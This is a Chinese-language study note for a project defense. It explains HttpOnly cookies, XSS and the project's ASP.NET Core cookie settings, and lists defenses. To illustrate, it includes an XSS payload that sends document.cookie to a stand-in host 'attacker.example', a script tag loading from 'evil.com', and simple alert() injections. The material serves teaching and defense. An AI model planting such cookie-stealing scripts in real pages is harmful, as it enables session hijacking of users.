# 06 - HttpOnly 与 XSS 详解

> 本篇专门解释两个安全词：  
> **HttpOnly 是什么、为什么叫 HttpOnly？XSS 是什么、为什么叫 XSS？为什么 Cookie 要设置 HttpOnly？**

---

## 0. 一句话（先背）

**HttpOnly 是 Cookie 的一个安全属性。**  
设置后，浏览器仍然会自动带着这个 Cookie 访问服务器，但前端 JavaScript 不能通过 `document.cookie` 读取它。

**XSS 是跨站脚本攻击。**  
攻击者想办法把恶意 JavaScript 塞进网页里执行，如果登录 Cookie 能被 JS 读取，就可能被偷走。

**XSS** 的全称是 **Cross-Site Scripting**，中文常译成 **跨站脚本攻击**。

## **为什么叫 “Cross-Site Scripting”？**

拆开看：


| **英文**         | **含义**                                                |
| -------------- | ----------------------------------------------------- |
| **Cross-Site** | 跨站：恶意脚本往往是在 **A 站** 被注入，却在用户访问 **B 站**（或同一站别的用户页面）时执行 |
| **Scripting**  | 脚本：攻击载体主要是 **JavaScript**（网页里的脚本语言）                   |


典型场景：某网站评论区没过滤用户输入，有人提交 `<script>...</script>`，别的用户打开页面时浏览器执行了这段脚本——这就是“把脚本塞进网页里执行”。

早期很多案例还涉及：恶意脚本从 **别的站点** 加载（例如 `<script src="https://evil.com/steal.js">`），所以强调 **Cross-Site（跨站）**。

## **为什么不叫 CSS？**

按字母缩写，Cross-Site Scripting 按理应是 **CSS**，但 **CSS 早就被占用了**：

- **CSS** = **C**ascading **S**tyle **S**heets（层叠样式表），管页面样式，1990 年代就有了。

安全圈为避免和样式表混淆，就改用 **XSS** 这个缩写（**X** 常表示 “cross” 或泛指某种攻击，类似 XML 里的 X）。

所以：**名字来自 “跨站 + 脚本”，缩写写成 XSS 是因为 CSS 已被占用。**

## **和 HttpOnly 的关系（一句话）**

XSS 让页面里能跑恶意 JS；若登录 Cookie **没有** HttpOnly，恶意 JS 可能用 `document.cookie` 把 Cookie 读走。  
**HttpOnly** 不能让 XSS 不发生，只是让 JS **读不到** 那个 Cookie，降低“偷登录态”的风险。



本项目里认证 Cookie 配置了：

```csharp
options.Cookie.HttpOnly = true;
```

意思是：

> `SpiritDesk.Auth` 这个登录 Cookie 不允许前端 JS 读取，降低被 XSS 脚本直接偷走 Cookie 的风险。

---

## 1. HttpOnly 是什么？

`HttpOnly` 是浏览器 Cookie 的一个标记。

普通 Cookie 可能长这样：

```http
Set-Cookie: theme=dark
```

带 `HttpOnly` 的 Cookie 可能长这样：

```http
Set-Cookie: SpiritDesk.Auth=一长串密文; HttpOnly
```

区别：


| Cookie 类型       | JavaScript 能不能读 | 请求时浏览器会不会自动带上 |
| --------------- | --------------- | ------------- |
| 普通 Cookie       | 能               | 会             |
| HttpOnly Cookie | 不能              | 会             |


重点是：

> HttpOnly 不是让 Cookie 不发送，而是让 JavaScript 不能读取 Cookie。

---

## 1.1 为什么叫 HttpOnly？

名字可以拆成 **Http** + **Only**：

| 部分 | 含义 |
|------|------|
| **Http** | 和 **HTTP 协议** 相关：Cookie 本来就是浏览器通过 HTTP/HTTPS 请求带给服务器的 |
| **Only** | **仅限** HTTP 这一层使用，不给页面里的脚本用 |

合起来的本意是：

> 这个 Cookie **只给 HTTP 通信用**，**不要**给网页里的 JavaScript 用。

### 谁在用、谁不能用？

| 访问方式 | 能不能碰这个 Cookie |
|----------|---------------------|
| 浏览器发 `GET /Index`、`POST /Login` 等 HTTP 请求 | 能（自动带上 Cookie） |
| 前端 `document.cookie` | 不能 |
| 页面里的 `<script>`、React/Vue 代码 | 不能读、不能写 |

所以叫 **HttpOnly**，不是说“只能 HTTPS”，也不是“只能服务器读”，而是强调：

**Cookie 走 HTTP 请求通道，不走 JS 脚本通道。**

### 和 Set-Cookie 里的写法对应

服务器下发 Cookie 时，响应头里会多一个标记：

```http
Set-Cookie: SpiritDesk.Auth=密文; HttpOnly
```

`HttpOnly` 这个词就写在这个 **HTTP 响应头** 里，浏览器看到后记住规则：以后发 HTTP 请求可以带这个 Cookie，但 JS 不能读。

ASP.NET Core 里写 `options.Cookie.HttpOnly = true`，最终也是让框架在 `Set-Cookie` 里加上这个标记。

### 容易误解的两点

| 误解 | 实际 |
|------|------|
| HttpOnly = 必须用 HTTPS | 不是。HttpOnly 和 **Secure** 是两回事；Secure 才强调 HTTPS 传输 |
| HttpOnly = Cookie 不会发给服务器 | 不是。浏览器访问同站地址时**照样会自动带** Cookie，只是 JS 读不到 |

### 历史背景（了解即可）

这个属性最早由 **微软在 IE 6 SP1（约 2002 年）** 提出，用来降低 XSS 偷 Cookie 的风险，后来被各大浏览器采纳，成为 Cookie 的标准安全属性之一。

答辩可以一句话说：

> HttpOnly 意思是 Cookie 仅供 HTTP 请求使用，禁止 JavaScript 通过 `document.cookie` 访问，从而减少 XSS 窃取登录态的风险。

---

## 2. 本项目哪里设置了 HttpOnly？

文件：

```text
src/SpiritDesk.Web/SpiritDeskWebHost.cs
```

Cookie 认证配置：

```csharp
builder.Services.AddAuthentication(CookieAuthenticationDefaults.AuthenticationScheme)
    .AddCookie(options =>
    {
        options.LoginPath = "/Login";
        options.LogoutPath = "/Logout";
        options.AccessDeniedPath = "/Login";
        options.SlidingExpiration = true;
        options.ExpireTimeSpan = TimeSpan.FromHours(12);
        options.Cookie.Name = "SpiritDesk.Auth";
        options.Cookie.HttpOnly = true;
        options.Cookie.SecurePolicy = CookieSecurePolicy.SameAsRequest;
        options.Cookie.SameSite = SameSiteMode.Lax;
    });
```

关键行：

```csharp
options.Cookie.HttpOnly = true;
```

含义：

- 登录成功后生成的 Cookie 名叫 `SpiritDesk.Auth`
- 它用于证明当前用户已经登录
- 设置 `HttpOnly = true` 后，前端 JS 无法读取它
- 浏览器 / WebView2 仍然会在访问同站页面时自动携带它

---

## 3. 为什么登录 Cookie 要设置 HttpOnly？

登录 Cookie 很重要，因为服务器靠它识别“你是谁”。

如果攻击者拿到了你的登录 Cookie，可能不需要知道密码，也能冒充你访问网站。

可以把 Cookie 理解成登录后的“入场手环”：

```text
账号密码登录成功
  ↓
服务器发一个 SpiritDesk.Auth Cookie
  ↓
浏览器以后自动带着它访问页面
  ↓
服务器验证 Cookie 合法，就认为你已登录
```

所以认证 Cookie 不能轻易暴露给前端脚本。

HttpOnly 的作用就是：

> 就算页面里不小心执行了恶意 JavaScript，它也不能直接通过 `document.cookie` 读取 `SpiritDesk.Auth`。

---

## 4. 没有 HttpOnly 会怎样？

假设认证 Cookie 不是 HttpOnly，恶意脚本可能这样偷 Cookie：

```html
<script>
  fetch("https://attacker.example/steal?cookie=" + document.cookie);
</script>
```

如果 `document.cookie` 能读到登录 Cookie，就可能把它发给攻击者。

攻击者拿到后，可能伪造请求：

```http
Cookie: SpiritDesk.Auth=被偷走的一长串密文
```

服务器看到 Cookie 合法，就可能误以为攻击者是已登录用户。

设置 HttpOnly 后：

```javascript
console.log(document.cookie);
```

读不到 `SpiritDesk.Auth` 这个认证 Cookie。

---

## 5. XSS 是什么？

XSS 全称是 **Cross-Site Scripting**，中文一般叫：

```text
跨站脚本攻击
```

为什么缩写不是 CSS？

> 因为 CSS 已经表示 Cascading Style Sheets（层叠样式表），所以 Cross-Site Scripting 通常缩写成 XSS。

XSS 的本质：

> 攻击者让原本不该执行的 JavaScript，在别人的网页里执行。

---

## 6. XSS 的简单例子

假设一个网站有评论功能，用户输入什么，页面就原样显示什么。

正常用户输入：

```text
这个项目很不错！
```

页面显示：

```html
<div class="comment">这个项目很不错！</div>
```

攻击者输入：

```html
<script>alert("你被攻击了")</script>
```

如果网站没有做任何过滤或编码，页面可能变成：

```html
<div class="comment">
  <script>alert("你被攻击了")</script>
</div>
```

浏览器看到 `<script>` 就会执行，这就是 XSS。

---

## 7. XSS 能做什么坏事？

恶意 JavaScript 一旦在用户页面里执行，可能会做很多事：

- 读取页面内容
- 伪造用户点击
- 读取普通 Cookie
- 偷走用户输入
- 代替用户发请求
- 修改页面显示内容
- 跳转到钓鱼网站

如果登录 Cookie 没有 HttpOnly，它还可能直接偷 Cookie。

所以：

> HttpOnly 主要防的是“XSS 后直接读取认证 Cookie”这一类风险。

---

## 8. HttpOnly 能完全防住 XSS 吗？

不能。

这是很重要的一点：

> HttpOnly 不能阻止 XSS 发生，只能降低 XSS 发生后偷 Cookie 的风险。

对比：


| 风险               | HttpOnly 能不能解决           |
| ---------------- | ------------------------ |
| JS 直接读取认证 Cookie | 能降低风险                    |
| 页面执行恶意脚本         | 不能阻止                     |
| 恶意脚本代替用户点按钮      | 不能完全阻止                   |
| 恶意脚本读取页面上的可见数据   | 不能阻止                     |
| 恶意脚本发起同站请求       | 不能完全阻止，因为浏览器仍会自动带 Cookie |


为什么恶意脚本还能发同站请求？

因为 HttpOnly 只是禁止 JS 读取 Cookie，不是禁止浏览器发送 Cookie。

例如恶意脚本虽然读不到 `SpiritDesk.Auth`，但仍可能执行：

```javascript
fetch("/Settings", { method: "GET" });
```

浏览器访问同站地址时，仍会自动带上 Cookie。

所以 XSS 本身仍然要认真防。

---

## 9. 如何防 XSS？

常见防护思路：

### 9.1 输出编码

把用户输入当普通文本显示，不当 HTML 执行。

例如用户输入：

```html
<script>alert(1)</script>
```

安全显示时应当变成文本：

```text
<script>alert(1)</script>
```

而不是让浏览器执行。

Razor 页面默认会对 `@变量` 做 HTML 编码，这是 ASP.NET Core 的一个重要安全默认值。

---

### 9.2 不随便使用 Html.Raw

在 Razor 中：

```csharp
@Html.Raw(userInput)
```

会把内容当 HTML 原样输出。

如果 `userInput` 来自用户输入，就很危险。

答辩可以说：

> Razor 默认会编码输出，但如果使用 `Html.Raw` 输出用户输入，就可能绕过编码，引入 XSS 风险。

---

### 9.3 校验和限制用户输入

例如：

- 用户名限制长度和字符范围
- 评论内容限制长度
- 不允许用户提交 `<script>` 等危险片段
- 富文本需要专门的白名单过滤库

---

### 9.4 设置 HttpOnly

即使真的出现 XSS，HttpOnly 也能让恶意脚本无法直接读到认证 Cookie。

本项目已经设置：

```csharp
options.Cookie.HttpOnly = true;
```

---

### 9.5 配合 SameSite、Secure、CSRF 防护

Cookie 安全通常不是只靠一个属性。

本项目还配置了：

```csharp
options.Cookie.SameSite = SameSiteMode.Lax;
options.Cookie.SecurePolicy = CookieSecurePolicy.SameAsRequest;
```

简单理解：


| 配置                        | 作用                    |
| ------------------------- | --------------------- |
| `HttpOnly`                | JS 读不到 Cookie         |
| `SameSite`                | 限制跨站请求带 Cookie 的场景    |
| `Secure` / `SecurePolicy` | HTTPS 场景下保护 Cookie 传输 |


---

## 10. HttpOnly、SameSite、Secure 区别


| 属性         | 主要防什么        | 一句话           |
| ---------- | ------------ | ------------- |
| `HttpOnly` | XSS 偷 Cookie | JS 不能读        |
| `SameSite` | CSRF 风险      | 跨站请求少带 Cookie |
| `Secure`   | 明文传输风险       | 只通过 HTTPS 发送  |


不要混淆：

- `HttpOnly` 管的是 **JavaScript 能不能读**
- `SameSite` 管的是 **跨站请求带不带**
- `Secure` 管的是 **HTTP / HTTPS 传输**

---

## 11. 本项目中一次安全 Cookie 流程

```text
用户提交登录表单
  ↓
Login.cshtml.cs 校验账号密码
  ↓
SignInAsync 创建认证票据
  ↓
ASP.NET Core 加密/签名票据
  ↓
响应 Set-Cookie: SpiritDesk.Auth=...; HttpOnly
  ↓
浏览器/WebView2 保存 Cookie
  ↓
后续访问页面时自动带 Cookie
  ↓
认证中间件验证 Cookie
  ↓
验证通过后设置 HttpContext.User
```

这里 `HttpOnly` 的位置在：

```text
Set-Cookie 阶段给 Cookie 加安全标记
```

---

## 12. 答辩怎么说

**问：HttpOnly 是什么？**  

> HttpOnly 是 Cookie 的安全属性，设置后前端 JavaScript 不能通过 `document.cookie` 读取这个 Cookie，但浏览器请求服务器时仍会自动携带。

**问：为什么叫 HttpOnly？**  

> 拆成 Http + Only：只给 HTTP 请求用，不给页面脚本用。浏览器发请求时会自动带 Cookie，但 JS 不能通过 `document.cookie` 读写它。

**问：你们项目哪里用了 HttpOnly？**  

> 在 `SpiritDeskWebHost.cs` 的 Cookie 认证配置里，`options.Cookie.HttpOnly = true`，保护登录 Cookie `SpiritDesk.Auth`。

**问：XSS 是什么？**  

> XSS 是跨站脚本攻击，攻击者把恶意 JavaScript 注入页面，让它在其他用户浏览器中执行。

**问：HttpOnly 和 XSS 有什么关系？**  

> 如果发生 XSS，恶意脚本可能尝试读取 Cookie。HttpOnly 能让脚本读不到认证 Cookie，降低登录 Cookie 被偷的风险。

**问：HttpOnly 能不能完全防 XSS？**  

> 不能。它不能阻止恶意脚本执行，只是防止脚本直接读取 Cookie。防 XSS 还需要输出编码、避免 `Html.Raw` 输出用户输入、限制输入和使用安全框架默认机制。

---

## 13. 最短记忆版

```text
HttpOnly：Http+Only，Cookie 只走 HTTP 请求，JS 读不到（不是“只能 HTTPS”）。
XSS：Cross-Site Scripting，跨站脚本；缩写用 XSS 因为 CSS 已被样式表占用。
关系：XSS 想偷 Cookie，HttpOnly 让它读不到登录 Cookie。
限制：HttpOnly 不等于防住 XSS，只是减少 Cookie 被偷。
```

上一篇：[05-Cookie四个概念详解.md](./05-Cookie四个概念详解.md)